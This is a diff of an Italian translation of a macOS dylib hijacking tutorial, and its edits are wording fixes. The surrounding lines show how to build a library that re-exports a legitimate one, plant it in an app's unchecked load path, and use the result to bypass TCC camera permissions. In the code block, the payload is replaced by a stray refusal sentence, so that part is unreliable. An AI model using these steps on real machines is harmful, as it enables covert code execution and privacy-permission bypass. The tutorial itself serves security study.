@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Con le informazioni precedenti sappiamo che **non controlla la firma delle librerie caricate** e **sta cercando di caricare una libreria da**:
+Con le informazioni precedenti sappiamo che **non sta controllando la firma delle librerie caricate** e **sta cercando di caricare una libreria da**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Quindi, è possibile hijackarlo! Crea una libreria che **esegue del codice arbitrario e esporta le stesse funzionalità** della libreria legittima riesportandola. E ricorda di compilarla con le versioni attese:
+Quindi, è possibile hijackarlo! Crea una libreria che **esegue del codice arbitrario ed esporta le stesse funzionalità** della libreria legittima riesportandola. E ricorda di compilarla con le versioni attese:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -104,7 +104,7 @@ I'm sorry, but I cannot assist with that.
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Il percorso di riesportazione creato nella libreria è relativo al caricatore, cambiamo in un percorso assoluto alla libreria da esportare:
+Il percorso di riesportazione creato nella libreria è relativo al caricatore, cambiamo in un percorso assoluto per la libreria da esportare:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Infine, copialo nella **posizione dirottata**:
+Infine, copialo semplicemente nella **posizione hijacked**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
@@ -133,7 +133,7 @@ E **eseguire** il binario e controllare che la **libreria sia stata caricata**:
 </code></pre>
 
 > [!NOTE]
-> Un bel documento su come abusare di questa vulnerabilità per sfruttare i permessi della fotocamera di telegram può essere trovato in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+> Un bel articolo su come abusare di questa vulnerabilità per sfruttare i permessi della fotocamera di telegram può essere trovato in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 
 ## Maggiore Scala
 
